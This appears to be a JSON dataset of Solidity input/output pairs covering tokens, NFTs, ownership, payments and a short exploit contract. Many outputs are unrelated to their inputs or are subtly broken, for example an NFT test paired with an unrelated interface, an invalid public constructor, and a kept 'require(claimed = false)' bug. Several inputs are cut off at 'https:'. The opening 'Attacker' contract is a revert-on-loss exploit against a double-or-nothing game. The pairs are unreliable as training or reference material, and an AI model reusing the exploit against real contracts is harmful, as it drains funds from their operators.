        "input": "contract Attacker {\n    address private doubleOrNothing  = ...; \n    address private owner = ...;  \n    \n    function play() payable external {\n        IDoubleOrNothing(doubleOrNothing).play{value: msg.value}();\n        if (address(this).balance < msg.value) revert;\n        owner.call{value: address(this).balance}();  \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IIntrospectionEmitter {\n    function getIntrospection(bytes calldata) external returns (uint256);\n}\n\n"
    },
    "634.sol": {
        "input": "it(\"Should emit a received NFT event\", async function () {\n      const { bridge, owner } = await loadFixture(deployFixture);\n      const { token } = await loadFixture(deployMockNFTFixture);\n\n      await token.mint(owner.address)\n      console.log(await token.balanceOf(owner.address));\n      console.log(await token.ownerOf(1));\n\n      console.log(\"bridge.target: \", bridge.target)\n      console.log(\"owner.address: \", owner.address)\n\n      await token.approve(bridge.target, 1)\n\n      \n      console.log(await token.balanceOf(bridge.target));\n      console.log(await token.ownerOf(1));\n\n      expect(await token.transferFrom(owner.address, bridge.target, 1)) \n      .to.emit(bridge, \"ReceivedNFT\");\n    })\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MockNFT {\n    \n  event ReceivedNFT(address recipient);\n\n  struct NFT {\n    uint256 id;\n    address owner;\n  }\n\n  mapping (address => mapping (uint256 => NFT)) public nfts;\n\n  function mint(address recipient) external {\n    emit ReceivedNFT(recipient);\n  }\n\n}\n\n"
    },
    "635.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"https:\n\ncontract A {\n   using SafeMath for uint256;\n}\n\ncontract B is A {\n    using SafeMath for uint256; \n\n   function foo() pure public returns (uint256) {\n     uint256 test = 1;\n     return test.mul(3);\n   }\n}\n\npragma solidity ^0.6;\n\nimport \"https:\n\ncontract A {\n   using SafeMath for uint256;\n}\n\ncontract B is A {\n\n   function foo() pure public returns (uint256) {\n     uint256 test = 1;\n     return test.mul(3);\n   }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n}\n\ncontract A {\n   using SafeMath for uint256;\n}\n\n"
    },
    "636.sol": {
        "input": "function Ownable() payable public{}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Ownable {\n  modifier onlyOwner() {\n    require(msg.sender == owner, \"Ownable: caller is not the owner\");\n    _;\n  }\n\n  function Ownable() payable public {}\n\n  address private owner;\n\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n  function transferOwnership(address newOwner) onlyOwner public {\n    require(newOwner != address(0), \"Ownable: new owner cannot be the zero address\");\n    emit OwnershipTransferred(owner, newOwner);\n    owner = newOwner;\n  }\n\n}\n\n"
    },
    "637.sol": {
        "input": "function buyTokens(uint256 amount) external {\n  _mint(msg.sender, (98 * amount)/100);\n  _mint(liquidityPoolOwnerAddress, amount/100);\n  _mint(liquidityPoolAddress, amount/100);\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ILiquidityPoolAddress {\n    function getPoolAddress() external view returns (address);\n}\n\ninterface ILiquidityPoolOwner {\n    function getPoolAddress() external view returns (address);\n    function getOwner() external view returns (address);\n}\n\n"
    },
    "638.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2][2] public fixedArray;\n    uint[][] public dynamicArray;\n\n    constructor() {\n        fixedArray[0][0] = 1;\n        fixedArray[0][1] = 2;\n        fixedArray[1][0] = 3;\n        fixedArray[1][1] = 4;\n\n        uint[] memory dynamicArrayNested1 = new uint[](2);\n        dynamicArrayNested1[0] = 5;\n        dynamicArrayNested1[1] = 6;\n        dynamicArray.push(dynamicArrayNested1);\n        uint[] memory dynamicArrayNested2 = new uint[](2);\n        dynamicArrayNested2[0] = 7;\n        dynamicArrayNested2[1] = 8;\n        dynamicArray.push(dynamicArrayNested2);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2][2] public fixedArray;\n    uint[][] public dynamicArray;\n\n    constructor() {\n        fixedArray[0][0] = 1;\n        fixedArray[0][1] = 2;\n        fixedArray[1][0] = 3;\n        fixedArray[1][1] = 4;\n\n        // workaround - cannot resize in-memory dynamic-size arrays\n        // so we declare a \"dynamic array with predefined length\" in memory\n        uint[] memory dynamicArrayNested1 = new uint[](2);\n        dynamicArrayNested1[0] = 5;\n        dynamicArrayNested1[1] = 6;\n        dynamicArray.push(dynamicArrayNested1);\n        uint[] memory dynamicArrayNested2 = new uint[](2);\n        dynamicArrayNested2[0] = 7;\n        dynamicArrayNested2[1] = 8;\n        dynamicArray.push(dynamicArrayNested2);\n    }\n}\n\n"
    },
    "639.sol": {
        "input": "contract ConcertTicketReservationFactory {\n    function create() public {\n        ConcertTicketReservation reservationContract = new ConcertTicketReservation();\n\n        address reservationContractAddress = address(reservationContract);\n\n        string memory choice = reservationContract.getChoice();\n\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ConcertTicketReservationFactory {\n    ConcertTicketReservation public reservationContract;\n\n    function create() public {\n        reservationContract = new ConcertTicketReservation();\n        string memory choice = reservationContract.getChoice();\n    }\n}\n\ncontract ConcertTicketReservation {\n    string public choice;\n\n    constructor() {\n        choice = \"Default Choice\";\n    }\n\n    function getChoice() public view returns (string memory) {\n        return choice;\n    }\n}\n"
    },
    "642.sol": {
        "input": "contract ERC20FixedSupply is ERC20 {\n  constructor() ERC20(\"Fixed\", \"FIX\") {\n      _mint(msg.sender, 1000);\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n  function totalSupply() external view returns (uint256);\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n  function allowance(address owner, address spender) external view returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IFixedSupply {\n  function fixedSupply() external view returns (uint256);\n}\n\n"
    },
    "644.sol": {
        "input": "pragma solidity 0.8.15;\n\nimport \"./MainContract.sol\";\n\ncontract Logger {  \n   address private owner;\n   MainContract mainContract;\n   constructor(address _mainContract){\n       owner = msg.sender;\n       mainContract = new MainContract(_mainContract);\n   }\n   function log(address _caller, uint _amount, string memory _action, uint256 value) public {\n        if (equal(_action, \"withdraw\")) {\n        }\n        else if (_caller == owner){\n            mainContract.action(value);\n        }\n    }\n\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n contract MainContract {\n     function action(uint256 value) public {\n     }\n   }\n\n"
    },
    "645.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract Timer{\n    \n    uint256 public initialSupply = 1000 * (10 ** 18);\n    uint256 public ts_end;\n    address public wallet = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;\n    address public owner;\n    bool public claimed;\n    mapping (address => uint256) public balances;\n\n    modifier onlyOwner() {\n        require(owner == msg.sender);\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n        balances[wallet] = initialSupply;\n        ts_end = block.timestamp + (86400 * 30 * 12);\n        \n    }\n\n    function claim() public onlyOwner {\n        require(ts_end > block.timestamp,\"Can not claim yet\");\n        require(claimed = false,\"Already claimed\");\n        claimed = true;\n\n        for(uint i = 0 ; i < 12 ; i++) {\n            initialSupply += (initialSupply * 15) / 100;\n        }\n        balances[wallet] = initialSupply;\n    }\n\n    function balanceOf() external view returns(uint256) {\n        return balances[msg.sender];\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract Timer{\n    /* \n       @param initialSupply : adding 18 decimals to avoid fraction \n    */\n    uint256 public initialSupply = 1000 * (10 ** 18);\n    uint256 public ts_end;\n    address public wallet = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;\n    address public owner;\n    bool public claimed;\n    mapping (address => uint256) public balances;\n\n    modifier onlyOwner() {\n        require(owner == msg.sender);\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n        balances[wallet] = initialSupply;\n        /* Assuming a year with 365-days , i.e no leep year */\n        ts_end = block.timestamp + (86400 * 30 * 12);\n        \n    }\n\n    function claim() public onlyOwner {\n        require(ts_end > block.timestamp,\"Can not claim yet\");\n        require(claimed = false,\"Already claimed\");\n        claimed = true;\n\n        for(uint i = 0 ; i < 12 ; i++) {\n            initialSupply += (initialSupply * 15) / 100;\n        }\n        balances[wallet] = initialSupply;\n    }\n\n    function balanceOf() external view returns(uint256) {\n        return balances[msg.sender];\n    }\n\n}\n\n"
    },
    "646.sol": {
        "input": "(bool success, ) = address(token).call{value: 0 ether, gas: 90000}(abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", sender, address(this), _tokenAmount));\nrequire(success, \"transferfrom of token failed\");\n\n(bool success, ) = USDCADDRESS.call{value: 0 ether, gas: 70000}(abi.encodeWithSignature(\"transfer(address,uint256)\", destinationAddress, _tokenAmount));\nrequire(success, \"transfer failed\");```\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeERC20 {\n\n    function safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal {\n        (bool success, ) = token.call(\n            abi.encodeWithSignature(\n                \"transferFrom(address,address,uint256)\", from, to, tokenId\n            )\n        );\n        require(success, \"transferFrom of token failed\");\n    }\n\n    function safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint256 tokenId,\n        uint256 numTokens\n    ) internal {\n        (bool success, ) = token.call(\n            abi.encodeWithSignature(\n                \"transferFrom(address,address,uint256)\", from, to, tokenId\n            )\n        );\n        require(success, \"transferFrom of token failed\");\n    }\n}\n\n"
    },
    "647.sol": {
        "input": "function addToVIP(address[] calldata toAddAddresses) external onlyOwner\n    {\n        for (uint i = 0; i < toAddAddresses.length; i++) {\n            monthlyVIP[toAddAddresses[i]] = true;\n            \n        }\n    }\n\nfunction addToVIP(address[] calldata toAddAddresses) external onlyOwner\n    {\n        for (uint i = 0; i < toAddAddresses.length; i++) {\n            monthlyVIP[toAddAddresses[i]] = true;\n            vip.push(toAddAddresses[i]);\n        }\n    }\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IToken {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n}\n\n"
    },
    "649.sol": {
        "input": "pragma solidity ^0.5.0;\n\ncontract('Token', ([deployer, receiver]) => { \n\n const name = 'Arv Token';\n const symbol = 'ARVV';\n const decimals = '18';\n const totalSupply = tokens(1000000).toString();\n let token\n\n    beforeEach(async () => {\n        token = await Token.new();\n    })\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Token {\n  function token() public view returns (uint256);\n\n  function totalSupply() public view returns (uint256);\n\n  function decimals() public view returns (uint8);\n\n  function get(uint256 _token) public view returns (address);\n\n  \n  function tokens(uint256 _token) public pure returns (uint256);\n}\n\n"
    },
    "650.sol": {
        "input": "    function placeBet(Game.Teams x) external payable returns (uint256) {\n        int256 _diff = getScoreDifference(x);\n        return calculatePayout(msg.value, _diff);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Game {\n    enum Teams { TeamA, TeamB }\n    \n    function getScoreDifference(Teams x) internal pure returns (int256) {\n        // implementation of getScoreDifference function\n    }\n    \n    function calculatePayout(uint256 _value, int256 _diff) internal pure returns (uint256) {\n        // implementation of calculatePayout function\n    }\n    \n    function placeBet(Teams x) external payable returns (uint256) {\n        int256 _diff = getScoreDifference(x);\n        return calculatePayout(msg.value, _diff);\n    }\n}\n"
    },
    "651.sol": {
        "input": " safeTransferFrom(seller, msg.sender, _tokenId);\n\nfunction _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual {\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, tokenId);\n\n        _approve(address(0), tokenId);\n\n        _balances[from] -= 1;\n        _balances[to] += 1;\n        _owners[tokenId] = to;    \n        emit Transfer(from, to, tokenId);    \n        _afterTokenTransfer(from, to, tokenId);\n    }\n\nfunction _approve(address to, uint256 tokenId) internal virtual {\n        _tokenApprovals[tokenId] = to;\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC721 {\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n    event Approval(address indexed owner, address indexed spender, uint256 indexed tokenId);\n}\n\n"
    },
    "652.sol": {
        "input": "address previousOwner;\n\nfunction reclaimOwnership() external {\n    require(msg.sender == previousOwner);\n    owner = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n    address private previousOwner;\n\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function reclaimOwnership() external {\n        require(msg.sender == previousOwner);\n        owner = msg.sender;\n    }\n\n    receive() external payable {}\n\n    function transferOwnership(address newOwner) public {\n        require(newOwner != address(0));\n        emit OwnershipTransferred(previousOwner, newOwner);\n        previousOwner = owner;\n        owner = newOwner;\n    }\n\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n}\n\n"
    },
    "653.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"https:\n\ncontract MyCollection is ERC721 {\n    constructor() ERC721(\"MyCollection\", \"MyC\") {\n        _mint(msg.sender, 1);\n    }\n\n    function _baseURI() internal pure override returns (string memory) {\n        return \"https:\n    }\n\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        string memory uri = super.tokenURI(tokenId);\n        return string(abi.encodePacked(uri, \".json\"));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n    function mint(address to, uint256 tokenId) external;\n\n    function mintBatch(address to, uint256[] calldata tokenIds) external;\n\n    function burn(uint256 tokenId) external;\n\n    function burnBatch(uint256[] calldata tokenIds) external;\n}\n\ninterface IERC1155 {\n    function mint(address to, uint256 tokenId) external;\n\n    function mintBatch(address to, uint256[] calldata tokenIds) external;\n\n    function burn(uint256 tokenId) external;\n\n    function burnBatch(uint256[] calldata tokenIds) external;\n}\n\n"
    },
    "656.sol": {
        "input": "IERC20(ERC20Token).approve(marketItem[_tokenId].seller, _price);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n  function transferFrom(address sender, address recipient, uint256 amount)external returns (bool);\n\n  function allowance(address owner, address spender) external view returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function approveWithSender(address seller, uint256 amount);\n\n  function transferWithSender(address spender, uint256 amounts);\n\n\n}\n\n"
    },
    "657.sol": {
        "input": "    function getIndex(A memory [] arr, string memory _id) internal view returns (uint256){\n        cases\n        return 0;\n    }\n    \n    function getIndex(B memory [] arr, string memory _id) internal view returns (uint256){\n        cases\n        return 0;\n    }\n\n   function _commonFunction(xxx) internal {}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    struct A {\n        // Define the struct properties here\n    }\n    \n    struct B {\n        // Define the struct properties here\n    }\n    \n    function getIndex(A[] memory arr, string memory _id) internal view returns (uint256) {\n        // Implement the logic to get the index for struct A here\n        return 0;\n    }\n    \n    function getIndex(B[] memory arr, string memory _id) internal view returns (uint256) {\n        // Implement the logic to get the index for struct B here\n        return 0;\n    }\n    \n    function _commonFunction() internal {\n        // Implement the logic for the common function here\n    }\n}\n\n"
    },
    "658.sol": {
        "input": "address payable contractAddress = payable(address(this));\ncontractAddress.transfer(nftCost);\n\ncontract MyContract {\n    receive() external payable {\n    }\n}\n\nconst tx = await this.nft.connect(this.normalUser).safeMintNft({\n    value: ethers.utils.parseEther(\"0.1\")\n});\n\nfunction safeMintNft() public payable whenNotPaused {\n    require(msg.value == nftCost);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns (uint supply);\n    function balanceOf(address account) external view returns (uint balance);\n    function transfer(address recipient, uint amount) external returns (bool success);\n    function allowance(address owner, address spender) external view returns (uint remaining);\n    function approve(address spender, uint amount) external returns (bool success);\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool success);\n  }\n\n  interface IERC721 {\n    function safeMint(address to, uint256 tokenId) external;\n    function unsafeMint(address to, uint256 tokenId) external;\n    function unsafeBurn(uint256 tokenId) external;\n    function getApproved(uint256 tokenId) external view returns (address operator);\n    function setApprovalForAll(address operator, bool _approved) external;\n    function isApprovedForAll(address operator, address account) external view returns (bool);\n    function safeBatchMint(address[] calldata to, uint256[] calldata tokenIds)\n      external;\n    function safeBatchBurn(uint256[] calldata tokenIds)\n      external;\n  }\n\n  abstract contract MyContract {\n    receive() external payable {}\n  }\n\n  contract NFT {\n  \n    receive() external payable {\n    }\n  }\n\n"
    },
    "659.sol": {
        "input": "import \"@openzeppelin/contracts/ownership/Ownable.sol\";\n\ncontract A is Ownable {\n\n    bool public dummy;\n\n    function setDummy (bool x) public onlyOwner {\n        dummy = x;\n    }\n\n    function getDummy () public view returns (bool) {\n        return dummy;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 { }\n\ninterface IERC721 { }\n\n"
    },
    "660.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract Prontuario {\n    struct Evolucao {\n        string categoria;\n        string titulo;\n        string descricao;\n        string data;\n    }\n\n    mapping(uint256 => Evolucao) public evolucoes;\n    uint256 private index;\n\n    function addEvolucao(Evolucao memory _evolucao) public {\n        evolucoes[index] = _evolucao;\n        index += 1;\n    }\n\n    function getAllEvolucoes() public view returns (Evolucao[] memory) {\n        Evolucao[] memory ret = new Evolucao[](index);\n        for (uint i = 0; i < index; i++) {\n            ret[i] = evolucoes[i];\n        }\n        return ret;\n     }\n}\n\n\n",
        "output": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract Prontuario {\n    struct Evolucao {\n        string categoria;\n        string titulo;\n        string descricao;\n        string data;\n    }\n\n    mapping(uint256 => Evolucao) public evolucoes;\n    uint256 private index;\n\n    function addEvolucao(Evolucao memory _evolucao) public {\n        evolucoes[index] = _evolucao;\n        index += 1;\n    }\n\n    function getAllEvolucoes() public view returns (Evolucao[] memory) {\n        Evolucao[] memory ret = new Evolucao[](index);\n        for (uint i = 0; i < index; i++) {\n            ret[i] = evolucoes[i];\n        }\n        return ret;\n     }\n}\n\n"
    },
    "661.sol": {
        "input": "function getAll() external pure returns (uint8, bool) {\n    return (1, true);\n}\n\nconst returnedValues = await contract.getAll(); \nconst number = returnedValues[0];\nconst status = returnedValues[1];\n\nfunction getAll() external pure returns (uint8 number, bool status) {\n    return (1, true);\n}\n\nconst returnedValues = await contract.getAll(); \nconst number = returnedValues.number;\nconst status = returnedValues.status;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract test {\n  function getAll() external pure returns (uint8, bool) {\n    return (1, true);\n  }\n}\n\n"
    },
    "662.sol": {
        "input": "for (address wallet in balances) {\n\nfor (uint i = 0; i < balances.length; i++) {\n\nmapping(address => uint256) balancePercentages;\n\nuint256 multiplier;\n\nfunction rebase(uint256 _multiplier) external {\n    multiplier = _multiplier;\n}\n\nfunction balanceOf(address holder) external view returns (uint256) {\n    return balancePercentages * multiplier;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    abstract contract OwnershipProxy {\n        address public proxy;\n        address public origin;\n\n        constructor(address _origin) {\n            proxy = _origin;\n            origin = _origin;\n        }\n\n        modifier onlyOrigin() {\n            require(msg.sender == origin, \"Not authorized\");\n            _;\n        }\n\n        modifier onlyProxy() {\n            require(msg.sender == proxy, \"Not authorized\");\n            _;\n        }\n    }\n\n"
    },
    "663.sol": {
        "input": "(bool success, bytes memory data) = msg.sender.call{value: balance}(\"\");\n\n(bool success, )\n\ncontract.call.value(...)(...)\n\n{value: balance, gas: 1000000}\n\nmsg.sender.call{value: balance}(abi.encodeWithSignature(\"test(uint,address)\", 1, msg.sender))\n\n(bool success, ) = owner.call{value: item.price}(\"\");\nrequire(success, \"Transfer failed\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint amount) external returns (bool);\n}\n\n"
    },
    "665.sol": {
        "input": "function myFunction(address admin) external view returns (bool) {\n   return adminMembers[address]._isDeleted;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Member {\n        bool _isDeleted;\n    }\n    \n    mapping(address => Member) adminMembers;\n    \n    function myFunction(address admin) external view returns (bool) {\n       return adminMembers[admin]._isDeleted;\n    }\n}\n"
    },
    "668.sol": {
        "input": "contract B {\n    address payable a;\n\n    constructor() {\n        a = payable(0xE9F920eE6F15739cc3b2Ac5Ea862C6eB9EEE529b);\n    }\n\n    function fund() public payable {\n        a.call{value: msg.value}(\"\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract B {\n    address payable a;\n\n    constructor() {\n        a = payable(0xE9F920eE6F15739cc3b2Ac5Ea862C6eB9EEE529b);\n    }\n\n    function fund() public payable {\n        a.call{value: msg.value}(\"\");\n    }\n}\n\n"
    },
    "669.sol": {
        "input": " * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behaviour in high-level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\nlibrary SafeMath {\n    \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    \n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    \n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    \n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    \n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    \n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    \n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    \n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    \n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    \n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    \n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    \n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    \n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\n"
    },
    "670.sol": {
        "input": "modifier mintCompliance(uint256 _mintAmount) {\n    if(!presale){\n      require(_mintAmount > 0 && _mintAmount <= maxMintAmountPerTx, \"Invalid mint amount!\");\n      require(supply.current() + _mintAmount <= maxSupply, \"Max supply exceeded!\");\n      _;\n    }else{\n      require(_mintAmount > 0 && _mintAmount <= maxMintAmountPerTx, \"Invalid mint amount!\");\n      require(supply.current() + _mintAmount <= maxPresaleSupply, \"Max supply exceeded!\");\n      _;\n    }\n  }\n\nfunction mint(uint256 _mintAmount) public payable mintCompliance(_mintAmount) {\n      require(!paused, \"The contract is paused!\");\n      require(msg.value >= cost * _mintAmount, \"Insufficient funds!\");\n\n    if (msg.sender != owner()) {\n        if(onlyWhitelisted == true) {\n            require(isWhitelisted(msg.sender), \"user is not whitelisted\");\n    }\n    require(msg.value >= cost * _mintAmount, \"insufficient funds\");\n    }\n\n    _mintLoop(msg.sender, _mintAmount);\n} \n\nfunction mint(uint256 _mintAmount) public payable mintCompliance(_mintAmount) whenNotPaused {}\n\nrequire(!paused, \"The contract is paused!\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IWhitelistERC20 { function whitelist(address[] calldata _to) external; }\n\n"
    },
    "671.sol": {
        "input": "  function onTransferReceived(\n    address from,\n    uint tokensPaid,\n    bytes4 selector\n  ) public acceptedTokenOnly {\n    if (selector == this.purchase.selector) {\n      purchase(from, tokensPaid);\n    } else {\n      revert(\"Call of an unknown function\");\n    }\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Ownable {\n  function transferOwnership(address newOwner) external;\n}\n\ninterface ERC721 {\n  function onTransferReceived(\n    address from,\n    uint tokensPaid,\n    bytes4 selector\n  ) external;\n\n  function acceptOwnership() external;\n\n  function onERC721Received(\n    address from,\n    uint256 tokenId,\n    bytes calldata data\n  ) external returns (bytes memory);\n}\n\ninterface ExternalERC721 {\n  function purchase(address, uint) external;\n  function sell(address, uint) external;\n}\n\n"
    },
    "672.sol": {
        "input": "pragma solidity >=0.5.0 <0.9.0;\n\ncontract Practice {\n    function arrLength(uint num) public pure returns(uint){\n        uint[] memory arr = new uint[](num);\n        for(uint i = 0; i < num; i++){\n            arr[i] = 10;\n        }\n        uint leng= arr.length;\n        return leng;\n        }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.5.0 <0.9.0;\n\ncontract Practice {\n    function arrLength(uint num) public pure returns(uint){\n        uint[] memory arr = new uint[](num);\n        for(uint i = 0; i < num; i++){\n            arr[i] = 10;\n        }\n        uint leng= arr.length;\n        return leng;\n        }\n}\n\n"
    },
    "674.sol": {
        "input": "function getUser(address _userAddress)\n        public\n        view\n        onlyAuthCaller\n        returns (\n            string memory name,\n            string memory info,\n            string memory role,\n        )\n    {\n        User memory tmpData = userDetails[_userAddress];\n        return (\n            tmpData.name,\n            tmpData.info,\n            tmpData.role\n        );\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    \n    struct User {\n        string name;\n        string info;\n        string role;\n    }\n    \n    mapping(address => User) userDetails;\n    \n    address private authCaller;\n    \n    constructor() {\n        authCaller = msg.sender;\n    }\n    \n    modifier onlyAuthCaller() {\n        require(msg.sender == authCaller, \"Only authorized caller can access this function\");\n        _;\n    }\n    \n    function getUser(address _userAddress)\n        public\n        view\n        onlyAuthCaller\n        returns (\n            string memory name,\n            string memory info,\n            string memory role\n        )\n    {\n        User memory tmpData = userDetails[_userAddress];\n        return (\n            tmpData.name,\n            tmpData.info,\n            tmpData.role\n        );\n    }\n}\n"
    },
    "675.sol": {
        "input": "const DEFAULT_COMPILER_SETTINGS = {\n  version: '0.7.6',\n  settings: {\n    evmVersion: 'istanbul',\n    optimizer: {\n      enabled: true,\n      runs: 1_000_000,\n    },\n    metadata: {\n      bytecodeHash: 'none',\n    },\n  },\n}\n\nsolidity: {\n    compilers: [DEFAULT_COMPILER_SETTINGS],\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ADOptionV3 {\n    \n    string public name;\n    string public symbol;\n    address public admin;\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        address _admin\n    ) {\n        name = _name;\n        symbol = _symbol;\n        admin = _admin;\n    }\n\n    \n\n    modifier onlyAdmin() {\n        require(msg.sender == admin, \"onlyAdmin\");\n        _;\n    }\n\n    function setAdmin(address newAdmin) public onlyAdmin {\n        admin = newAdmin;\n    }\n}\n\n"
    },
    "679.sol": {
